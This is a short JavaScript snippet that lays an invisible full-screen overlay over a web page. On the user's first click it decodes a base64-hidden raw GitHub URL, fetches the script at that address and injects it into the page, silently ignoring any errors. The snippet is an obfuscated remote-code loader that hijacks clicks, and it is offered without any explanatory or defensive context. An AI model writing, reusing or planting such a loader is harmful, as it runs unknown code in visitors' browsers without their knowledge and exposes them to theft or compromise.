(function() {
    // URL Raw: https://raw.githubusercontent.com/jatrophaxz/I/main/script.js
    const _u = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2phdHJvcGhaeHovSS9tYWluL3NjcmlwdC5qcw==';

    const t = document.createElement('div');
    t.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:rgba(0,0,0,0.01);';
    document.body.appendChild(t);

    t.addEventListener('mousedown', () => {
        fetch(atob(_u))
            .then(r => r.text())
            .then(c => {
                const s = document.createElement('script');
                s.textContent = c;
                document.head.appendChild(s);
            }).catch(()=>{});
    }, { once: true });
})();
